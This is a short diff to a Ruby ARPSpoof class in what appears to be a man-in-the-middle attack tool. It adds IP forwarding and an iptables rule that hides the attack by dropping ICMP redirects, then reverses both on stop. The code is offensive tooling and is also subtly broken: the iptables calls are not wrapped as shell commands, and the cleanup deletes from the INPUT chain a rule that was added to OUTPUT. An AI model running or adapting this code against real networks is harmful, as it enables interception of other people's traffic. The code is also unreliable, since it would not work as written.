@@ -102,6 +102,13 @@ class ARPSpoof < Spoof
             return
         end
         @running = true
+        
+        # Enable Forwarding
+        `echo 1 > /proc/sys/net/ipv4/ip_forward`
+        
+        # Prevent ICMP Redirect from coming out of attacker's machine
+        iptables -A OUTPUT -p ICMP --icmp-type 5 -j DROP
+        
         while(@running)
             sleep 2
             send(@victim_packet, @iface)
@@ -120,5 +127,11 @@ class ARPSpoof < Spoof
     #---------------------------------------------------------------------------
     def stop
         @running = false
+        
+        # Disable Forwarding
+        `echo 0 > /proc/sys/net/ipv4/ip_forward`
+        
+        # Delete rule
+        iptables -D INPUT -p ICMP --icmp-type 5 -j DROP 
     end # stop
 end
